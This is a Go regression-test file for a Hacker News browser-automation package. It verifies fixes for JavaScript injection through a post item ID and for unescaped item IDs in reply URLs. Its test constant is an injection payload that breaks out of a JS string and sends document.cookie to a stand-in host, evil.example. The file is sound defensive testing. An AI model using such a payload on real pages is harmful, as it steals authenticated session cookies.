//go:build social

package hackernews

import (
	"net/url"
	"strings"
	"testing"
)

// jsInjectionPayload is a crafted itemID that would break out of a
// single-quoted/backtick-templated JS string literal and run arbitrary
// script if it were ever interpolated directly into JS source passed to
// page.Eval. It's the reference payload from the reported vulnerability:
// an attacker-controlled itemID (from scraped content, a webhook, or LLM
// output flowing into call_bot_method) reading document.cookie — the live,
// authenticated news.ycombinator.com session cookie — and exfiltrating it.
const jsInjectionPayload = `'); fetch('https://evil.example/'+document.cookie); //`

// TestPostMetricsEvalArgsDoesNotInterpolateItemID is a regression test for
// GetPostMetrics's JS-injection vulnerability: itemID was previously
// fmt.Sprintf'd directly into the JS source string handed to page.Eval,
// letting a hostile itemID break out of the '#score_%s' string literal and
// execute arbitrary script inside the authenticated HN browser session.
//
// The fix passes itemID as a page.Eval *function argument* instead, so the
// JS source string is now a constant, independent of itemID. This test
// isolates the string-construction step (postMetricsEvalArgs) so the
// safety property is directly verifiable without a live browser page.
func TestPostMetricsEvalArgsDoesNotInterpolateItemID(t *testing.T) {
	js, args := postMetricsEvalArgs(jsInjectionPayload)

	if strings.Contains(js, jsInjectionPayload) {
		t.Fatalf("JS source must never contain the raw itemID payload, got source: %s", js)
	}
	// Guard against a regression back to fmt.Sprintf-style interpolation.
	if strings.Contains(js, "%s") || strings.Contains(js, "%q") {
		t.Fatalf("JS source must be a constant template with no Sprintf verbs, got: %s", js)
	}
	if len(args) != 1 {
		t.Fatalf("expected itemID to be passed as exactly one Eval argument, got %d: %v", len(args), args)
	}
	if args[0] != jsInjectionPayload {
		t.Fatalf("expected itemID to be passed through unmodified as a function argument, got %v", args[0])
	}
	// The JS itself must be a function literal that accepts itemID as a
	// parameter (the mechanism that keeps it out of the source string).
	if !strings.Contains(js, "(itemID)") {
		t.Fatalf("expected the JS to declare itemID as a function parameter, got: %s", js)
	}
}

// TestPostMetricsEvalArgsOrdinaryID is a sanity check that legitimate,
// numeric item IDs still round-trip correctly through the fixed code path.
func TestPostMetricsEvalArgsOrdinaryID(t *testing.T) {
	js, args := postMetricsEvalArgs("38472619")
	if js == "" {
		t.Fatal("expected non-empty JS source")
	}
	if len(args) != 1 || args[0] != "38472619" {
		t.Fatalf("expected itemID '38472619' passed as arg, got %v", args)
	}
}

// TestBuildReplyURL is a regression test for ReplyToComment's identical
// unescaped-interpolation pattern: itemID was fmt.Sprintf'd raw into the
// reply URL (both the "id" query param and the pre-percent-encoded "goto"
// value), so a crafted itemID containing "&", "#", or other reserved URL
// characters could corrupt the query string or smuggle extra parameters.
// The fix builds the URL with net/url so itemID is always properly
// percent-encoded, regardless of content.
func TestBuildReplyURL(t *testing.T) {
	got := buildReplyURL(jsInjectionPayload)

	if strings.Contains(got, jsInjectionPayload) {
		t.Fatalf("reply URL must not contain the raw itemID payload unescaped, got: %s", got)
	}

	parsed, err := url.Parse(got)
	if err != nil {
		t.Fatalf("buildReplyURL produced an invalid URL: %v", err)
	}
	if parsed.Scheme != "https" || parsed.Host != "news.ycombinator.com" || parsed.Path != "/reply" {
		t.Fatalf("unexpected URL shape: %s", got)
	}

	q := parsed.Query()
	if q.Get("id") != jsInjectionPayload {
		t.Fatalf("id query param round-trip mismatch: got %q want %q", q.Get("id"), jsInjectionPayload)
	}
	if want := "item?id=" + jsInjectionPayload; q.Get("goto") != want {
		t.Fatalf("goto query param round-trip mismatch: got %q want %q", q.Get("goto"), want)
	}
}

// TestBuildReplyURLOrdinaryID is a sanity check that legitimate, numeric
// item IDs still produce the expected reply URL shape.
func TestBuildReplyURLOrdinaryID(t *testing.T) {
	got := buildReplyURL("38472619")
	parsed, err := url.Parse(got)
	if err != nil {
		t.Fatalf("buildReplyURL produced an invalid URL: %v", err)
	}
	q := parsed.Query()
	if q.Get("id") != "38472619" {
		t.Fatalf("id = %q, want 38472619", q.Get("id"))
	}
	if q.Get("goto") != "item?id=38472619" {
		t.Fatalf("goto = %q, want item?id=38472619", q.Get("goto"))
	}
}
